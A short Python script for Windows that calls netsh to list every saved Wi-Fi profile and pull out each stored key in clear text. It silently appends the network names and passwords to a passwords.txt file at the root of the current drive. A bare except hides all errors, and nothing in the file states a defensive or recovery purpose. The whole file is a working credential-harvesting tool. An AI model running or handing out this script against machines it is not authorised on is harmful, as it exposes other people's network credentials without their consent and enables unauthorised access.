import os
from re import findall

if __name__ == "__main__":
    drive=os.popen("cd").readlines()[0][:-2]
    filepath = os.path.join('%s/'%(drive), 'passwords.txt')
    try:
        f = open(filepath, "a")
        l=findall(r'(?<=: )(.*?)(?=\n)',os.popen("netsh wlan show profiles").read())
        for i in l:
            s=findall(r'(?<=Key Content            : )(.*?)(?=\n)',os.popen("netsh wlan show profile \"%s\" key=clear"%(i)).read())
            f.write("{} {}\n".format(i,s))
        f.close()
    except:
        pass
    
